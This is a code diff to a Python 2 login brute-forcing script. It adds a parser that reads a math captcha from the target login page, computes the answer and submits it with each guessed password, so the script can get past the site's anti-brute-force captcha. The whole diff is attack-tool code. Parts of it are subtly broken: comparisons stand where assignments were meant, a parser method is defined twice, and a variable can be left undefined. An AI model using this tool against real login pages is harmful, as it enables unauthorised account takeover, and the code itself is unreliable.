@@ -69,6 +69,8 @@ class Bruter(object):
             opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
             response = opener.open(self.target_url)
             page = response.read()
+#            print('Here is the page')
+#            print(page)
 
             print "Trying: %s : %s (%d left)" % (self.username,brute,
                     self.password_q.qsize())
@@ -84,9 +86,26 @@ class Bruter(object):
             #from the html response
             post_tags = parser.tag_results
 
+            #check if captch block was found
+            if parser.data_captcha_block:
+                captcha_val1 = int(parser.data_captcha_block[3])
+                captcha_val2 = int(parser.data_captcha_block[4].replace('=',''))
+                captcha_operator = parser.entityref_captcha_block
+
+                #sometimes the operator is not properly encoded
+                #we need to check source code of the page
+                if captcha_operator == '' :
+                    if '&#43' in page:
+                        captcha_operator = 'plus'
+                    else:
+                        captcha_operator == 'divide'
+
+                captcha_value = parser.handle_captcha(captcha_val1,
+                        captcha_val2, captcha_operator)
             # add our username and password fields
             post_tags[self.username_field] = self.username
             post_tags[self.password_field] = brute
+            post_tags['ux_txt_captcha_input'] = captcha_value
             login_data = urllib.urlencode(post_tags)
 
             #Not sure we really need a target_post here.
@@ -171,10 +190,20 @@ class BruteParser(HTMLParser):
     def __init__(self):
         HTMLParser.__init__(self)
         self.tag_results = {}
+        self.tag = ""
+        self.captcha_block = False
+        self.data_captcha_block = []
+        self.entityref_captcha_block = ''
 
     #This method is automaticaly called during self.feed()
+    def handle_data(self, data):
+        if self.tag == "input":
+            print(data)
+
     def handle_starttag(self, tag, attrs):
+        #print(tag)
         if tag == "input":
+            self.tag == "input"
             tag_name = None
             tag_value = None
             for name,value in attrs:
@@ -185,6 +214,42 @@ class BruteParser(HTMLParser):
             if tag_name is not None:
                 self.tag_results[tag_name] = value
 
+        #check if this tag contains the captcha block
+        if tag == 'p':
+            for name, value in attrs:
+                #check whether we enter the captach block to 
+                #bruteforce it
+                if name == 'class' and value == 'cptch_block':
+                    self.captcha_block = True
 
 
+    def handle_endtag(self, tag):
+        #if we see closing tag p, means we are out of
+        #captcha block
+        if tag =='p':
+            self.captcha_block = False
+
+    def handle_data(self, data):
+
+        #if we are in captcha block we capture the data
+        if self.captcha_block:
+            #only the index 3 and 4 are useful, the rest is garbage
+            self.data_captcha_block.append(data)
+
+    def handle_entityref(self, entity):
+        if self.captcha_block:
+            self.entityref_captcha_block = entity
+
+    def handle_captcha(self,val1, val2, op):
+        if op == 'minus':
+            return val1 - val2
+
+        elif op == 'times':
+            return val1 * val2
+
+        elif op == 'plus':
+            return val1 + val2
+        
+        else:
+            return val1 / val2
 
